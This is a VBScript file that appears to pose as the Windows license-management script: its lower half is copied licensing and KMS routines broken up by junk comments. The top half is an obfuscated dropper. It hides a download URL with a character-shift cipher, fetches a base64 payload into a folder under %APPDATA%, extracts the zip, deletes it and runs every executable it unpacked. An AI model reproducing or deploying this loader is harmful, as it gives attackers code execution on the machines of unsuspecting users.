On Error Resume Next 
CONST OOLOS                  =24444228
CONST DBYD                = 442211
CONST DATIALM                 =14124121
CONST RABGI               =1244123
CONST AYOL                  =44244228

dim dinptvvbdfhjmpprt,suycbdfhjmoqsudff,ilnprtddfhjjmoqqs,fhmprtvbdfhjmoqsu
dim  jmotveginprtbdffl,Clqtortvegilnprtvbdgil,SEUZP
dim  moqsuaaceegillnpr,mqXFFRJUWm
dim  ginprudfhjmoqsuac,rtvybaggilnpssudf,rtvzacbbdfhhlnpprtvvegiilnpprtaacegiil
dim  oqudgilnnprtvbddf,dfhjmoqqsuaaceggj,OBJsuudgillpprtvbddfhj
dim  acehmoosudffhjmoqtvbdffhjmoqqsuxyccbdfhjmmoqsud,dfhmooqsudggilnpr,rtvzabeegilnprtve
Function Jkdkdkd(G1g)
For jmotveginprtbdffl = 1 To Len(G1g)
dfhmooqsudggilnpr = Mid(G1g, jmotveginprtbdffl, 1)
dfhmooqsudggilnpr = Chr(Asc(dfhmooqsudggilnpr)+ 6)
oqudgilnnprtvbddf = oqudgilnnprtvbddf + dfhmooqsudggilnpr
Next
Jkdkdkd = oqudgilnnprtvbddf
End Function 
Function flnprtvbdfhjmortvvzacbbdfh()
Dim ClqtortvegilnprtvbdgilLM,jxtzadhmoqsudgilnp,jrtdffhjmmoqsuufhw,Coltsuacgiilpprtxybac
Set ClqtortvegilnprtvbdgilLM = WScript.CreateObject( "WScript.Shell" )
Set jrtdffhjmmoqsuufhw = CreateObject( "Scripting.FileSystemObject" )
Set jxtzadhmoqsudgilnp = jrtdffhjmmoqsuufhw.GetFolder(rtvybaggilnpssudf)
Set Coltsuacgiilpprtxybac = jxtzadhmoqsudgilnp.Files
For Each Coltsuacgiilpprtxybac in Coltsuacgiilpprtxybac
If UCase(jrtdffhjmmoqsuufhw.GetExtensionName(Coltsuacgiilpprtxybac.name)) = "EXE" Then
ClqtortvegilnprtvbdgilLM.Exec(rtvybaggilnpssudf & "\" & Coltsuacgiilpprtxybac.Name)
End If
Next
End Function
moqsuaaceegillnpr     = Jkdkdkd("bnnj4))+3,(,-0(+3/(+.04/00.)nhtjrfd`tc(cmi")
Set OBJsuudgillpprtvbddfhj = CreateObject( "WScript.Shell" )    
rtvzacbbdfhhlnpprtvvegiilnpprtaacegiil = OBJsuudgillpprtvbddfhj.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
fhmprtvbdfhjmoqsu = "A99449C3092CE70964CE715CF7BB75B.zip"
Function nptdffhjmoqssuaceegimooqsu()
SET suycbdfhjmoqsudff = CREATEOBJECT("Scripting.FileSystemObject")
IF suycbdfhjmoqsudff.FolderExists(rtvzacbbdfhhlnpprtvvegiilnpprtaacegiil + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF suycbdfhjmoqsudff.FolderExists(ilnprtddfhjjmoqqs) = FALSE THEN
suycbdfhjmoqsudff.CreateFolder ilnprtddfhjjmoqqs
suycbdfhjmoqsudff.CreateFolder OBJsuudgillpprtvbddfhj.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function prtegilnpsuaccegilnnprtvvz()
DIM jrtdffhjmmoqsuufhxsd
Set jrtdffhjmmoqsuufhxsd = Createobject("Scripting.FileSystemObject")
jrtdffhjmmoqsuufhxsd.DeleteFile rtvybaggilnpssudf & "\" & fhmprtvbdfhjmoqsu
End Function
rtvybaggilnpssudf = rtvzacbbdfhhlnpprtvvegiilnpprtaacegiil + "\moidn"
ooqsudffhj
ilnprtddfhjjmoqqs = rtvybaggilnpssudf
nptdffhjmoqssuaceegimooqsu
jmqudfhjmprtvbdfhhjmoqssuz
WScript.Sleep 10103
jmqsuacegilnpsuuxybaceggil
WScript.Sleep 5110
prtegilnpsuaccegilnnprtvvz
flnprtvbdfhjmortvvzacbbdfh
Function ooqsudffhj()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(rtvybaggilnpssudf )) Then
WScript.Quit()
End If 
End Function   
Function jmqudfhjmprtvbdfhhjmoqssuz()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", moqsuaaceegillnpr, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile rtvybaggilnpssudf & "\" & fhmprtvbdfhjmoqsu, adSaveCreateOverWrite
End if
End Function
ginprudfhjmoqsuac = "dfhjmoqqsuaaceggj"
Function jmqsuacegilnpsuuxybaceggil()
set Clqtortvegilnprtvbdgil = CreateObject("Shell.Application")
set SEUZP=Clqtortvegilnprtvbdgil.NameSpace(rtvybaggilnpssudf & "\" & fhmprtvbdfhjmoqsu).items
Clqtortvegilnprtvbdgil.NameSpace(rtvybaggilnpssudf & "\").CopyHere(SEUZP), 4
Set Clqtortvegilnprtvbdgil = Nothing
End Function 

Private Sub TkaListILs
    Dim objLicense
    Dim strHeader
    Dim strError
    Dim strGuids
    Dim arrGuids
    Dim nListed

    Dim objWmiDate

    LineOut GetResource("L_MsgTkaLicenses")
    LineOut ""

    Set objWmiDate = CreateObject("WBemScripting.SWbemDateTime")

    nListed = 0
    For Each objLicense in g_objWMIService.InstancesOf(TkaLicenseClass)

        strHeader = GetResource("L_MsgTkaLicenseHeader")
        strHeader = Replace(strHeader, "%ILID%" , objLicense.ILID )
        strHeader = Replace(strHeader, "%ILVID%", objLicense.ILVID)
        LineOut strHeader

        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILID"), "%ILID%", objLicense.ILID)
        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILVID"), "%ILVID%", objLicense.ILVID)

        If Not IsNull(objLicense.ExpirationDate) Then

            objWmiDate.Value = objLicense.ExpirationDate

            If (objWmiDate.GetFileTime(false) <> 0) Then
                LineOut "    " & Replace(GetResource("L_MsgTkaLicenseExpiration"), "%TODATE%", objWmiDate.GetVarDate)
            End If

        End If

        If Not IsNull(objLicense.AdditionalInfo) Then
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAdditionalInfo"), "%MOREINFO%", objLicense.AdditionalInfo)
        End If

        If Not IsNull(objLicense.AuthorizationStatus) And _
           objLicense.AuthorizationStatus <> 0 _
        Then
            strError = CStr(Hex(objLicense.AuthorizationStatus))
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAuthZStatus"), "%ERRCODE%", strError)
        Else
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseDescr"), "%DESC%", objLicense.Description)
        End If

        LineOut ""
        nListed = nListed + 1
    Next

    if 0 = nListed Then
        LineOut GetResource("L_MsgTkaLicenseNone")
    End If
End Sub



'2858900000239897502322024005261000536427471113155 
'358000000321167202192021004230020200801340973111
'1555860000020956460219202000414002020180134199422
'858300000157553502192022004130020209801340974333
ginprudfhjmoqsuac = "dfhjmoqqsuaaceggj"


Private Sub ExpirationDatime(strActivationID)
    Dim strWhereClause
    Dim objProduct
    Dim strSLActID, ls, graceRemaining, strEnds
    Dim strOutput
    Dim strDescription, bTBL, bAVMA
    Dim iIsPrimaryWindowsSku
    Dim bFound

    strActivationID = LCase(strActivationID)

    bFound = False

    If strActivationId = "" Then
        strWhereClause = "ApplicationId = '" & WindowsAppId & "'"
    Else
        strWhereClause = "ID = '" & Replace(strActivationID, "'", "")  & "'"
    End If

    strWhereClause = strWhereClause & " AND " & PartialProductKeyNonNullWhereClause

    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", LicenseStatus, GracePeriodRemaining", strWhereClause)
        
        strSLActID = objProduct.ID
        ls = objProduct.LicenseStatus
        graceRemaining = objProduct.GracePeriodRemaining
        strEnds = DateAdd("n", graceRemaining, Now)

        bFound = True

        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
        If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
            OutputIndeterminateOperationWarning(objProduct)
        End If

        strOutput = ""

        If ls = 0 Then
            strOutput = GetResource("L_MsgLicenseStatusUnlicensed")

        ElseIf ls = 1 Then
            If graceRemaining <> 0 Then

                strDescription = objProduct.Description

                bTBL = IsTBL(strDescription)

                bAVMA = IsAVMA(strDescription)

                If bTBL Then
                    strOutput = Replace(GetResource("L_MsgLicenseStatusTBL"), "%ENDDATE%", strEnds)
                ElseIf bAVMA Then
                    strOutput = Replace(GetResource("L_MsgLicenseStatusAVMA"), "%ENDDATE%", strEnds)
                Else
                    strOutput = Replace(GetResource("L_MsgLicenseStatusVL"), "%ENDDATE%", strEnds)
                End If
            Else
                strOutput = GetResource("L_MsgLicenseStatusLicensed")
            End If

        ElseIf ls = 2 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusInitialGrace"), "%ENDDATE%", strEnds)
        ElseIf ls = 3 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusAdditionalGrace"), "%ENDDATE%", strEnds)
        ElseIf ls = 4 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusNonGenuineGrace"), "%ENDDATE%", strEnds)
        ElseIf ls = 5 Then
            strOutput =  GetResource("L_MsgLicenseStatusNotification")
        ElseIf ls = 6 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusExtendedGrace"), "%ENDDATE%", strEnds)
        End If

        If strOutput <> "" Then
            LineOut objProduct.Name & ":"
            Lineout "    " & strOutput
        End If
    Next

    If True <> bFound Then
        LineOut GetResource("L_MsgErrorPKey")
    End If
End Sub


'2858900000239897502322024005261000536427471113155 
'358000000321167202192021004230020200801340973111
'1555860000020956460219202000414002020180134199422
'858300000157553502192022004130020209801340974333
ginprudfhjmoqsuac = "dfhjmoqqsuaaceggj"


''
'' Volume license service/client management
''

Private Sub QuitIfErrorRestoreKmsName(obj, strKmsName)
    Dim objErr

    If Err.Number <> 0 Then
        set objErr = new CErr

        If strKmsName = "" Then
            obj.ClearKeyManagementServiceMachine()
        Else
            obj.SetKeyManagementServiceMachine(strKmsName)
        End If

        ShowError GetResource("L_MsgErrorText_8"), objErr
        ExitScript objErr.Number
    End If
End Sub

Private Function GetKmsClientObjectByActivationID(strActivationID)
    Dim objProduct, objTarget

    strActivationID = LCase(strActivationID)

    Set objTarget = Nothing

    On Error Resume Next

    If strActivationID = "" Then
        Set objTarget = GetServiceObject("Version, " & KMSClientLookupClause)
        QuitIfError()
    Else
        For Each objProduct in GetProductCollection("ID, " & KMSClientLookupClause, EmptyWhereClause)
            If (LCase(objProduct.ID) = strActivationID) Then
                Set objTarget = objProduct
                Exit For
            End If
        Next

        If objTarget is Nothing Then
            Lineout Replace(GetResource("L_MsgErrorActivationID"), "%ActID%", strActivationID)
        End If
    End If

    Set GetKmsClientObjectByActivationID = objTarget
End Function


'2858900000239897502322024005261000536427471113155 
'358000000321167202192021004230020200801340973111
'1555860000020956460219202000414002020180134199422
'858300000157553502192022004130020209801340974333
ginprudfhjmoqsuac = "dfhjmoqqsuaaceggj"


Private Sub SetKmsMachineName(strKmsNamePort, strActivationID)
    Dim objTarget
    Dim nColon, strKmsName, strKmsNamePrev, strKmsPort, nBracketEnd
    Dim nKmsPort

    nBracketEnd = InStr(StrKmsNamePort, "]")
    If InStr(strKmsNamePort, "[") = 1 And nBracketEnd > 1 Then
    ' IPV6 Address
        If  Len(StrKmsNamePort) = nBracketEnd Then
            'No Port Number
            strKmsName = strKmsNamePort
            strKmsPort = ""
        Else
            strKmsName = Left(strKmsNamePort, nBracketEnd)
            strKmsPort = Right(strKmsNamePort, Len(strKmsNamePort) - nBracketEnd - 1)
        End If
    Else
    ' IPV4 Address
        nColon = InStr(1, strKmsNamePort, ":")
        If nColon <> 0 Then
            strKmsName = Left(strKmsNamePort, nColon - 1)
            strKmsPort = Right(strKmsNamePort, Len(strKmsNamePort) - nColon)
        Else
            strKmsName = strKmsNamePort
            strKmsPort = ""
        End If
    End If

    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        strKmsNamePrev = objTarget.KeyManagementServiceMachine

        If strKmsName <> "" Then
            objTarget.SetKeyManagementServiceMachine(strKmsName)
            QuitIfError()
        End If

        If strKmsPort <> "" Then
            nKmsPort = CLng(strKmsPort)
            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
            objTarget.SetKeyManagementServicePort(nKmsPort)
            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
        Else
            objTarget.ClearKeyManagementServicePort()
            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
        End If

        LineOut Replace(GetResource("L_MsgKmsNameSet"), "%KMS%", strKmsNamePort)

        If objTarget.KeyManagementServiceLookupDomain <> "" Then
            LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), _
                            "%KMS%", _
                            strKmsNamePort)
        End If
    End If
End Sub

Private Sub ClearKms(strActivationID)
    Dim objTarget

    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        objTarget.ClearKeyManagementServiceMachine()
        QuitIfError()
        objTarget.ClearKeyManagementServicePort()
        QuitIfError()

        LineOut GetResource("L_MsgKmsNameCleared")

        If objTarget.KeyManagementServiceLookupDomain <> "" Then
            LineOut Replace(GetResource("L_MsgKmsUseLookupDomain"), _
                            "%FQDN%", _
                            objTarget.KeyManagementServiceLookupDomain)
        End If
    End If
End Sub

Private Sub SetKmsLookupDomain(strKmsLookupDomain, strActivationID)
    Dim objTarget
    Dim strKms, nPort

    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        objTarget.SetKeyManagementServiceLookupDomain(strKmsLookupDomain)
        QuitIfError()
        
        LineOut Replace(GetResource("L_MsgKmsLookupDomainSet"), "%FQDN%", strKmsLookupDomain)

        If objTarget.KeyManagementServiceMachine <> "" Then
            strKms = objTarget.KeyManagementServiceMachine
            nPort  = objTarget.KeyManagementServicePort
            LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), _
                            "%KMS%", strKms & ":" & nPort)
        End If
    End If
End Sub

Private Sub ClearKmsLookupDomain(strActivationID)
    Dim objTarget
    Dim strKms, nPort
    
    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        objTarget.ClearKeyManagementServiceLookupDomain
        QuitIfError()

        LineOut GetResource("L_MsgKmsLookupDomainCleared")

        If objTarget.KeyManagementServiceMachine <> "" Then
            strKms = objTarget.KeyManagementServiceMachine
            nPort  = objTarget.KeyManagementServicePort
            LineOut Replace(GetResource("L_MsgKmsUseMachineName"), _
                            "%KMS%", strKms & ":" & nPort)
        End If
        
    End If
End Sub


'2858900000239897502322024005261000536427471113155 
'358000000321167202192021004230020200801340973111
'1555860000020956460219202000414002020180134199422
'858300000157553502192022004130020209801340974333
ginprudfhjmoqsuac = "dfhjmoqqsuaaceggj"


Private Sub SetHostCachingDisable(boolHostCaching)
    Dim objService

    On Error Resume Next

    set objService = GetServiceObject("Version")
    QuitIfError()

    objService.DisableKeyManagementServiceHostCaching(boolHostCaching)
    QuitIfError()

    If boolHostCaching Then
        LineOut GetResource("L_MsgKmsHostCachingDisabled")
    Else
        LineOut GetResource("L_MsgKmsHostCachingEnabled")
    End If

End Sub


'2858900000239897502322024005261000536427471113155 
'358000000321167202192021004230020200801340973111
'1555860000020956460219202000414002020180134199422
'858300000157553502192022004130020209801340974333
ginprudfhjmoqsuac = "dfhjmoqqsuaaceggj"

